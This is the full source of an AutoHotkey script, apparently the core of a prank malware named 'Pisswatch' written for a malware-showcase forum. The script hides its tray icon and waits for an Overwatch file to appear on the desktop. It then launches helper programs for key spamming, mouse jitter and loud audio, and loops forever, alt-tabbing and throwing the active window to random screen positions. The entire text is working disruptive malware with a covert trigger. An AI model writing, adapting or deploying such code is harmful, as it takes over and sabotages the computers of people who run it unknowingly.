#NoTrayIcon
; The heart of Pisswatch, this controls almost everything ever!
;(C) 2016 OMFGThor / Goldstar, made exclusively for Danooct1 forums
Start:
Sleep, 10000
IfExist, %A_Desktop%\*overwatch*.*
Goto, Payload
IfNotExist, %A_Desktop%\*overwatch*.*
Goto, Start
Payload:
Run, checkfile.exe
Run, spamNumCapsScrl.exe
Run, jittermouse.exe
Run, earrape.exe
;DllCall("dwmapi\DwmEnableComposition", "uint", 0)
Loop
{
Send {Alt down}
Random, spamkey , 1, 12
loop, %spamkey%
{
Send {Tab}
}
Send {Alt up}
Random, randx, 1, %A_ScreenWidth%
Random, randy, 1, %A_ScreenHeight%
WinMove, A, , randx, randy
Sleep 150
}